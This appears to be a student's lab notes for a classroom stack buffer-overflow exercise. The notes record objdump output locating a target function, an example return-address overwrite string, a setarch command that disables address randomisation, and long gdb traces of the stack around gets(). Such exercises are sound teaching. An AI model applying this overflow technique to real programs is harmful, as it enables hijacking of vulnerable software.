@@ -1,0 +1,149 @@
+tshaikmohamm@remote06:~/Documents/subjects/IntroToCS$ objdump -d ./vuln_program | grep target
+08049196 <target>:
+ 8049213:       e8 7e ff ff ff          call   8049196 <target>
+
+For Example, if my target function's address is 
+objdump -d ./vuln_program | grep target
+08049196 <target>:
+ 8049213:       e8 7e ff ff ff          call   8049196 <target>
+Then the attack string should be this
+\x96\x91\x04\x08\x00\x00\x00\x00
+or 
+AAAA96910408
+or
+AAAA\x96\x91\x04\x08
+
+Shell Setarch Invocation
+setarch `uname -m` -R ./vuln_program < shell_string
+
+GDB output
+
+(gdb) break main
+Breakpoint 4 at 0x80491f5: file vuln_program.c, line 20.
+(gdb) run
+Starting program: /home/tshaikmohamm/Documents/subjects/IntroToCS/vuln_program < shell_string
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+
+Breakpoint 4, main () at vuln_program.c:20
+20              prompt();
+(gdb) stepi
+prompt () at vuln_program.c:13
+13      void prompt(){
+(gdb)
+0x080491b7      13      void prompt(){
+(gdb) stepi
+0x080491b9      13      void prompt(){
+(gdb) stepi
+15              gets(buf);
+(gdb) stepi
+0x080491bf      15              gets(buf);
+(gdb) info frame
+Stack level 0, frame at 0xffffd890:
+ eip = 0x80491bf in prompt (vuln_program.c:15); saved eip = 0x80491fa
+ called by frame at 0xffffd8b0
+ source language c.
+ Arglist at 0xffffd888, args:
+ Locals at 0xffffd888, Previous frame's sp is 0xffffd890
+ Saved registers:
+  ebp at 0xffffd888, eip at 0xffffd88c
+(gdb) x/24wx $esp
+0xffffd864:     0x00000000      0xf7d8ea2f      0xf7f8f048      0xf7fc14a0
+0xffffd874:     0xf7fd970b      0xf7d8ea2f      0xf7fc14a0      0xffffd8c0
+0xffffd884:     0xf7fc1678      0xffffd898      0x080491fa      0x00000001
+0xffffd894:     0xffffd8b0      0x00000000      0xf7d952c5      0x00000000
+0xffffd8a4:     0x00000070      0xf7ffcff4      0xf7d952c5      0x00000001
+0xffffd8b4:     0xffffd964      0xffffd96c      0xffffd8d0      0xf7f8eff4
+(gdb) stepi
+0x080491c2      15              gets(buf);
+(gdb) stepi
+0x080491c3      15              gets(buf);
+(gdb) stepi
+0x08049050 in gets@plt ()
+(gdb) stepi
+0x08049056 in gets@plt ()
+(gdb) stepi
+0x0804905b in gets@plt ()
+(gdb) stepi
+0x08049020 in ?? ()
+(gdb) stepi
+0x08049026 in ?? ()
+(gdb) stepi
+_dl_runtime_resolve () at ../sysdeps/i386/dl-trampoline.S:30
+30      ../sysdeps/i386/dl-trampoline.S: No such file or directory.
+(gdb) stepi
+32      in ../sysdeps/i386/dl-trampoline.S
+(gdb) stepi
+34      in ../sysdeps/i386/dl-trampoline.S
+(gdb) stepi
+36      in ../sysdeps/i386/dl-trampoline.S
+(gdb) stepi
+37      in ../sysdeps/i386/dl-trampoline.S
+(gdb) stepi
+38      in ../sysdeps/i386/dl-trampoline.S
+(gdb) stepi
+_dl_fixup (l=0xf7ffda50, reloc_arg=16) at ./elf/dl-runtime.c:46
+46      ./elf/dl-runtime.c: No such file or directory.
+(gdb) stepi
+0xf7fd9621      46      in ./elf/dl-runtime.c
+(gdb) stepi
+0xf7fd9623      46      in ./elf/dl-runtime.c
+(gdb) stepi
+0xf7fd9624      46      in ./elf/dl-runtime.c
+(gdb) stepi
+0xf7fecaa2 in __x86.get_pc_thunk.di () from /lib/ld-linux.so.2
+(gdb) stepi
+0xf7fecaa5 in __x86.get_pc_thunk.di () from /lib/ld-linux.so.2
+(gdb) stepi
+0xf7fd9629 in _dl_fixup (l=0xf7ffda50, reloc_arg=16) at ./elf/dl-runtime.c:46
+46      in ./elf/dl-runtime.c
+(gdb) stepi
+0xf7fd962f      46      in ./elf/dl-runtime.c
+(gdb) stepi
+0xf7fd9630      46      in ./elf/dl-runtime.c
+(gdb) stepi
+0xf7fd9631      46      in ./elf/dl-runtime.c
+(gdb) stepi
+0xf7fd9633      46      in ./elf/dl-runtime.c
+(gdb) stepi
+0xf7fd9636      48      in ./elf/dl-runtime.c
+(gdb) stepi
+0xf7fd9639      46      in ./elf/dl-runtime.c
+(gdb) stepi
+0xf7fd963d      48      in ./elf/dl-runtime.c
+(gdb) stepi
+0xf7fd9640      48      in ./elf/dl-runtime.c
+(gdb) stepi
+47      in ./elf/dl-runtime.c
+(gdb) stepi
+81      ../sysdeps/generic/ldsodefs.h: No such file or directory.
+(gdb) stepi
+0xf7fd964e      81      in ../sysdeps/generic/ldsodefs.h
+(gdb) < shell_string
+
+
+
+New Address Check
+(gdb) s
+0xf7de6514 in _IO_gets (buf=0xffffd87c "\240\024\374\367\300\330\377\377x\026\374\367\230\330\377\377\372\221\004\b\001") at ./libio/iogets.c:37
+37      ./libio/iogets.c: No such file or directory.
+(gdb) x/30wx $esp
+0xffffd830:     0x00000000      0xf7f8eff4      0x0804bf04      0xf7ffcb80
+0xffffd840:     0xffffd888      0xf7fdb710      0xffffd8d0      0xf7f8eff4
+0xffffd850:     0x0804bf04      0xf7ffcb80      0xffffd888      0x080491c8
+0xffffd860:     0xffffd87c      0x00000000      0xf7d8ea2f      0xf7f8f048
+0xffffd870:     0xf7fc14a0      0xf7fd970b      0xf7d8ea2f      0xf7fc14a0
+0xffffd880:     0xffffd8c0      0xf7fc1678      0xffffd898      0x080491fa
+0xffffd890:     0x00000001      0xffffd8b0      0x00000000      0xf7d952c5
+0xffffd8a0:     0x00000000      0x00000070
+(gdb) info frame
+Stack level 0, frame at 0xffffd860:
+ eip = 0xf7de6514 in _IO_gets (./libio/iogets.c:37); saved eip = 0x80491c8
+ called by frame at 0xffffd890
+ source language c.
+ Arglist at 0xffffd858, args: buf=0xffffd87c "\240\024\374\367\300\330\377\377x\026\374\367\230\330\377\377\372\221\004\b\001"
+ Locals at 0xffffd858, Previous frame's sp is 0xffffd860
+ Saved registers:
+  ebx at 0xffffd84c, ebp at 0xffffd858, esi at 0xffffd850, edi at 0xffffd854, eip at 0xffffd85c
+(gdb)  x/1wb 0xffffd87c
+0xffffd87c:     0xa0
